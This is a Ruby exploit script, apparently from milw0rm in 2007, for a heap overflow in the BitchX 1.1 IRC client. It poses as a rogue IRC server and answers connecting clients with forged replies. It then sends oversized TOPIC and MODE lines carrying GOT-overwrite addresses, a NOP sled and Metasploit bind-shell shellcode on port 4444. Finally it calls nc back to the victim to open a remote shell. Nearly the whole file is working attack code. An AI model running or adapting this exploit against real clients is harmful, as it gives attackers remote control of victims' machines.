#!/usr/bin/env ruby
######################################################
# BitchX-1.1 Final MODE Heap Overflow [0-day]
# By bannedit
# Discovered May 16th 2007
# - Yet another overflow which can overwrite GOT
#
# I found this vuln after modifying ilja's ircfuzz
# code. Currently this exploit attempts to
# overwrite the GOT with the ret address to the
# shellcode.
#
# The actually vulnerability appears to be a stack
# overflow in p_mode. Due to input size restrictions
# the overflow can't occur on the stack because we can
# only overflow so much data. Luckily though we
# overwrite a structure containing pointers to heap
# data. This allows us to overwrite the GOT.
#
# Reliability of this exploit in its current stage is
# limited. There appears to be several factors which
# restrict the reliability.
#######################################################

require 'socket'

#the linux 2.6 target most effective atm
targets = { 'linux 2.6' => '0x81861c8', 'linux 2.6 Hardened (FC6)' =>
'0x8154d70','freebsd' => '0x41414141' }

shellcode = #fork before binding a shell provides a clean exit
            "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x05\x6a\x01\x58\xcd\x80"+

             #metasploit linux x86 shellcode bind tcp port 4444
            "\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfc"+
            "\x98\xd8\xb8\x83\xeb\xfc\xe2\xf4\xcd\x43\x8b\xfb\xaf\xf2\xda\xd2"+
            "\x9a\xc0\x41\x31\x1d\x55\x58\x2e\xbf\xca\xbe\xd0\xed\xc4\xbe\xeb"+
            "\x75\x79\xb2\xde\xa4\xc8\x89\xee\x75\x79\x15\x38\x4c\xfe\x09\x5b"+
            "\x31\x18\x8a\xea\xaa\xdb\x51\x59\x4c\xfe\x15\x38\x6f\xf2\xda\xe1"+
            "\x4c\xa7\x15\x38\xb5\xe1\x21\x08\xf7\xca\xb0\x97\xd3\xeb\xb0\xd0"+
            "\xd3\xfa\xb1\xd6\x75\x7b\x8a\xeb\x75\x79\x15\x38"
           

port = (ARGV[0] || 6667).to_i
sock = TCPServer.new('0.0.0.0', port)

ret = (targets['linux 2.6 Hardened (FC6)'].hex)

puts "----------------------------------------------"
puts "- BitchX-1.1 Final Mode Heap Buffer Overflow -"
puts "- By bannedit                                -"
puts "----------------------------------------------"


puts "\n[-] listening for incoming clients..."

while (client = sock.accept)
   ip = client.peeraddr

   buffer = client.gets
   puts "[<] #{buffer}"
  
   hostname = ([ret].pack('V')) * 13
   nick = "bannedit"

   #Fake server reply to connection
   buffer = ":#{nick} MODE #{nick} :+iw\r\n"+
            ":0 001 #{nick} :biznitch-1.0\r\n"+
            ":5 002 #{nick} :biznitch-1.0\r\n"+
            ":6 003 #{nick} :a\r\n"+
            ":aaa 004 #{nick} :a\r\n"+
            ":aaa 005 #{nick} :a\r\n"+
            ":aaa 251 #{nick} :a\r\n"+
            ":aaa 252 #{nick} :a\r\n"+
            ":aaa 253 #{nick} :a\r\n"+
            ":aaa 254 #{nick} :a\r\n"+
            ":aaa 255 #{nick} :a\r\n"+
            ":aaa 375 #{nick} :a\r\n"+
            ":aaa 372 #{nick} :a\r\n"+
            ":aaa 376 #{nick} :a\r\n"
           
   join =   ":aaa 302 #{nick} :#{nick}=+#{nick}@#{nick}\r\n"+      
            ":#{nick}!#{nick}@#{hostname * 4} JOIN :#hackers\r\n"

   puts "[>] sending fake server response"
   client.send(buffer, 0)
   sleep(2)
#   client.send(join, 0)

   topic =  ":aaa TOPIC #hackers:"
   ret = ret + 0x200
   topic<<  ([ret].pack('V')) * 100
   topic<< "\r\n"
   for i in 0..20
   client.send(topic, 0)
   end

   puts "[>] sending evil buffer"
   evilbuf = ":#{hostname}  MODE "
   evilbuf<< "#{nick} :aaa"
   ret = ret + 0x200
   evilbuf<< ([ret].pack('V')) * 200
   evilbuf<< "\x90" * (1126 - shellcode.length)
   evilbuf<< shellcode
   evilbuf<< "\x90" * 40
   evilbuf<< "\r\n"
  
   for i in 0..5
      client.send(evilbuf, 0)
   end

sleep(10) #wait for the shellcode to do its thing...

puts "[+] exploit completed if successful port 4444 should be open"
puts "[+] connecting to #{ip[3]} on port 4444 and dropping shell...\n\n"

   fork {
           system("nc #{ip[3]} 4444")
           puts "[+] exiting shell dropping back to listener"
        }
end

# milw0rm.com [2007-08-27]
